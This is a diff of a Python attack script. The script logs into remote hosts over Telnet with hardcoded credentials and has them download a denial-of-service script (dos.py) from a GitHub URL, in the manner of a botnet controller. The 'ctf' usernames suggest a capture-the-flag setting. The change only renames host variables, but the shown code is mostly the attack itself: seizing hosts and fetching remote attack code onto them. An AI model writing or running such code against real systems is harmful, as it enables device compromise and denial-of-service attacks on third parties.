@@ -42,18 +42,18 @@ class Trigger(object):
         telnetlib.Telnet.close(dev)
 
 if __name__ == '__main__':
-    Host_ctrled=b'153.0.0.181'
+    Host_ctrled_1=b'153.0.0.181'
     username = b'ctf'
     passwd = b'test1234'
 
-    Host_attack=b'153.0.0.171'
+    Host_ctrled_2=b'153.0.0.171'
     user = b'ctf'
     pawd = b'ctff1234'
 
     path = b'https://raw.githubusercontent.com/bl201809/bllist/master/dos/dos.py'
     hack = Trigger()
-    #dev = hack.login(Host_ctrled,username,passwd)
-    dev = hack.login(Host_attack,user,pawd)
+    #dev = hack.login(Host_ctrled_1,username,passwd)
+    dev = hack.login(Host_ctrled_2,user,pawd)
     if not hack.checkIN(dev):
         hack.dosDownLoad(dev,path)
     time.sleep(2)
